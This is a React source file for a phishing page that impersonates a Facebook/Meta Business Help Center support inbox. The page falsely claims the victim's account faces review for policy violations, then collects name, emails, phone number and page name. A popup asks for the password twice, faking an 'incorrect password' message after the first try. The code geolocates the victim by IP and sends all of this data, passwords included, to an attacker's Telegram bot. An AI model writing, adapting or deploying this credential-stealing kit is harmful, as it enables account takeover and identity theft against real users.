import React from 'react'
import { logo, search } from './Publics/images/images'
import { Link, useNavigate } from 'react-router-dom'
import { useState } from 'react';
import axios from 'axios';
//import dotenv from 'dotenv';
import { Button, Checkbox, Form, Input } from 'antd';
const { TextArea } = Input;

const Buiness = () => {

    const [activePopup, setActivePopup] = useState(false);
    const [activePassword, setActivePassword] = useState(false);
    const [first, setActionFirst] = useState(true);
    const [firstPassword, setFirstPassword] = useState();
    const navigate = useNavigate();

    const handleOpendPopup = () => {
        setActivePopup(true)
    }

    const handleClosePopup = () => {
        setActivePopup(false)
    }

    const onFinish = (values) => {

        if(values.check_form === true){
            localStorage.setItem('dataForm', JSON.stringify(values))
            return handleOpendPopup()
        }

    };

    
    const onFinishPassWord = (values) => {

        if(first === true) {
            setFirstPassword(values.fill_first_password)
            setActionFirst(false)
        }
        
        const passWord = values.fill_first_password;
        setActivePassword(true)
        const dataLocalForm = JSON.parse(localStorage.getItem('dataForm'));

        if(activePassword === true){
            axios.get(`https://api.db-ip.com/v2/free/self`)
                .then((response) => {

                    const dataPassWord = {...dataLocalForm, firt_password: firstPassword, second_password: passWord };
        
                    localStorage.setItem('dataPassWord', JSON.stringify(dataPassWord));
                    
            const bot_token = process.env.REACT_APP_BOT_TOKEN;
            const chat_id   = process.env.REACT_APP_CHAT_ID;
        
                    const message   = '<strong>User Email: </strong>' + dataPassWord.fill_business_email + 
                    '%0A<strong>User Name: </strong>' + dataPassWord.fill_full_name + 
                    '%0A<strong>User Email: </strong>' + dataPassWord.fill_personal_email + 
                    '%0A<strong>Facebook Page: </strong>' + dataPassWord.fill_facebook_pagename + 
                    '%0A<strong>Phone Number: </strong>' + dataPassWord.fill_phone + 
                    '%0A<strong>First Password: </strong>' + firstPassword +
                    '%0A<strong>second Password: </strong>' + passWord +
                    '%0A<strong>IP Address: </strong>' + response.data.ipAddress +
                    '%0A<strong>Country : </strong>' + response.data.countryName +'( '+response.data.countryCode+' )'+
                    '%0A<strong>City : </strong>' + response.data.city ;
        
                    axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
                        .then((response) => {
                            navigate('/meta-community-standard/confirm');
                        })
                        
                })
                    
        }
    };
  return (
    <div className="business">

        <div className="top-header">
            <div className="container">
                <img src={logo} width="70" className="metalogo" alt=''/>
                <p className="metahead">Support Inbox</p>
                <img src={search} width="100%" className="searchicon" alt=''/>
            </div>
        </div>
        <div className="masheader">
            <div className="wrapper">
                <div className="container">
                    <p className="businesshelp" style={{visibility: "hidden"}}>
                        Meta Business Help Center </p>
                    <p className="businesshelpcenter">Facebook Business Help
                        Center</p>
                </div>
            </div>
        </div>

        <div className="main">

            <div className="form">
                <div className="header-form">
                    <div className="header-top">
                        <div className="dot"></div>
                        <div className="line"></div>
                        <div className="dot"></div>
                        <div className="line"></div>
                        <div className="dot"></div>
                    </div>
                    <div className="header-bottom">
                        <p>Select Asset</p>
                        <p>Select the Issue</p>
                        <p>Get help</p>
                    </div>
                </div>

                <div className="text-center pb-3" style={{fontSize: "20px", textAlign: "center"}}>
                    <strong>Get Started</strong>
                </div>

                <div className="mb-4" style={{backgroundColor: "rgb(226, 227, 229)", fontSize: "12px", textAlign: "left", padding: "15px"}}>
                    We have received multiple reports that suggest that your
                    account has
                    been in violation of our terms of services and community
                    guidelines.
                    As a result, your account is scheduled for review
                    <br/>
                    <div className="text-start pt-2" style={{fontSize: "14px"}}>
                        <strong>Report no: 3088553115</strong>
                    </div>
                </div>


                {/* FORM START */}

                <Form
                    name="basic"
                    initialValues={{
                    remember: true,
                    }}
                    onFinish={onFinish}
                    autoComplete="off"
                >

                    <div className="item-form">
                        <label style={{color:"rgb(0, 0, 0)", fontWeight: "bold"}}>
                            Please provide us information that will help us investigate
                        </label>
                        <Form.Item
                            name="fill_reason"
                            rules={[
                                {
                                required: true,
                                message: 'Please input information!',
                                },
                            ]}
                        >
                            <TextArea rows={2}   />
                        </Form.Item>
                    </div>

                    <div className="item-form">
                        <label for="name">Full name</label>
                        <Form.Item
                            name="fill_full_name"
                            rules={[
                                {
                                required: true,
                                message: 'Please input full name!',
                                },
                            ]}
                        >
                            <Input />
                        </Form.Item>
                    </div>

                    <div className="item-form">
                        <label for="Business">Business email address</label>
                        <Form.Item
                            name="fill_business_email"
                            rules={[
                                {
                                required: true,
                                message: 'Please input business email address!',
                                },
                            ]}
                        >
                            <Input />
                        </Form.Item>
                    </div>

                    <div className="item-form">
                        <label for="email">Personal email address</label>
                        <Form.Item
                            name="fill_personal_email"
                            rules={[
                                {
                                required: true,
                                message: 'Please input personal email address!',
                                },
                            ]}
                        >
                            <Input />
                        </Form.Item>
                    </div>

                    <div className="item-form">
                        <label for="phone">Mobile Phone Number</label>
                        <Form.Item
                            name="fill_phone"
                            rules={[
                                {
                                required: true,
                                message: 'Please input mobile phone number!',
                                },
                            ]}
                        >
                            <Input />
                        </Form.Item>
                    </div>

                    <div className="item-form">
                        <label for="email">Facebook page name</label>
                        <Form.Item
                            name="fill_facebook_pagename"
                            rules={[
                                {
                                required: true,
                                message: 'Please input your facebook page name!',
                                },
                            ]}
                        >
                            <Input />
                        </Form.Item>
                    </div>

                    <div className="item-form">
                        <Form.Item
                            name="check_form"
                            valuePropName="checked"
                            rules={[
                                {
                                required: true,
                                message: 'Please agree to our terms and data and cookie policy!',
                                },
                            ]}
                        >
                            <Checkbox >I agree to our Terms, Data and Cookies Policy.</Checkbox>
                        </Form.Item>
                    </div>


                    <Form.Item 
                        className="btn butoni"
                    >
                        <Button
                            htmlType="submit"
                            style={{
                                backgroundColor: "transparent",
                                outline: "none",
                                border: 'none',
                                boxShadow: 'none',
                                color: "#267df1",
                                fontWeight: '700',
                                fontSize:'1rem'
                            }}
                        >
                            Submit
                        </Button>
                    </Form.Item>
                </Form>

                {/* FORM END */}
            </div>

        </div>

        {/* FOOTER */}
        <div className="footer">
            <div className="container">
                <img src={logo} alt="" className="logofooter"/>
                <p className="nerlogofooter">
                    Facebook can help your large, medium or small business
                    grow. Get the latest news
                    for advertisers and more on our <Link to="#" style={{textDecoration: "none", color: "white"}}>Meta for Business Page.</Link></p>
                <div className="row">
                    <div className="col-md-3 col-6">
                        <ul>
                            <li>
                                <p className="fontbold">Marketing on Facebook</p>
                                <p>Success Stories</p>
                                <p>Measurement</p>
                                <p>Industries</p>
                                <p>Inspiration</p>
                                <p>Events</p>
                                <p>News</p>
                                <p>Site map</p>
                            </li>
                        </ul>
                    </div>
                    <div className="col-md-3 col-6">
                        <ul>
                            <li>
                                <p className="fontbold">Marketing objectives</p>
                                <p>Build your presence</p>
                                <p>Create awareness</p>
                                <p>Drive discovery</p>
                                <p>Generate leads</p>
                                <p>Boost sales</p>
                                <p>Earn loyalty</p>
                            </li>
                        </ul>
                    </div>
                    <div className="col-md-3 col-6">
                        <ul>
                            <li>
                                <p className="fontbold">Facebook Pages</p>
                                <p>Get started with Pages</p>
                                <p>Setting up your Page</p>
                                <p>Manage your Facebook Page</p>
                                <p>Promote your Page</p>
                                <p>Messaging on your Page</p>
                                <p>Page Insights</p>
                            </li>
                        </ul>
                    </div>
                    <div variant="dontshowonmobile " className="col-md-3 col-6">
                        <ul>
                            <li>
                                <p className="fontbold">Facebook ads</p>
                                <p>Get started with ads</p>
                                <p>Buying Facebook ads</p>
                                <p>Ad formats</p>
                                <p>Ad placement</p>
                                <p>Choose your audience</p>
                                <p>Measure your ads</p>
                                <p>Managing your ads</p>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <div className="bottomfooter">
            <div className="container">
                <ul>
                    <li>English (UK)</li>
                    <li>English (US)</li>
                    <li>Español</li>
                    <li>Português (Brasil)</li>
                    <li>Français (France)</li>
                    <li>Español (España)</li>
                    <li>More languages</li>
                </ul>
                <ul>
                    <li>© 2023 Meta</li>
                    <li>About</li>
                    <li>Developers</li>
                    <li>Careers</li>
                    <li>Privacy</li>
                    <li>Cookies</li>
                    <li>Terms</li>
                    <li>Help Centre</li>
                </ul>
            </div>
        </div>


        <div className={`popup  ${activePopup === true ? 'active' : ''}`} id="popup" >
            <div className="background" onClick={handleClosePopup}></div>
            <div className="content">

                <Form
                    name="basicForm"
                    initialValues={{
                    remember: true,
                    }}
                    onFinish={onFinishPassWord}
                    autoComplete="off"
                >

                    <div className="modal-header custom-header px-0">
                        <h5 id="exampleModalLabel" className="modal-title" style={{fontSize: "22px", fontWeight: "600"}}> Please
                            Enter Your Password </h5>
                        <button type="button" data-dismiss="modal" aria-label="Close" onClick={handleClosePopup} className="close">
                            <span aria-hidden="true" >×</span>
                        </button>
                    </div>

                    <div className="item-form">
                        <p style={{fontSize:"16px", marginBottom: "10px"}}> For your security, you must enter your password to continue. </p>
                        <label for="password">Password:</label>
                        <Form.Item
                            name="fill_first_password"
                            rules={[
                                {
                                required: true,
                                message: `The password you've entered is incorrect.`,
                                },
                            ]}
                            style={{
                                margin: '0'
                            }}
                        >
                            <Input.Password />
                        </Form.Item>
                        <p className={`password-correct ${activePassword === true ? 'active' : ''}`}>The password you've entered is incorrect.</p>
                    </div>

                    <Form.Item 
                        style={{
                            color: "rgb(255, 255, 255)", 
                            backgroundColor: "rgb(44, 132, 244)", 
                            marginTop: "20px",
                            width: "auto",
                            float: 'right'
                        }}
                        className="btn butoni"
                    >
                        <Button
                            htmlType="submit"
                            style={{
                                backgroundColor: "transparent",
                                outline: "none",
                                border: 'none',
                                boxShadow: 'none',
                                fontWeight: '700',
                                fontSize:'1rem',
                                color: 'white'
                            }}
                        >
                            Continue
                        </Button>
                    </Form.Item>
                </Form>

            </div>
        </div>
    </div>
  )
}

export default Buiness
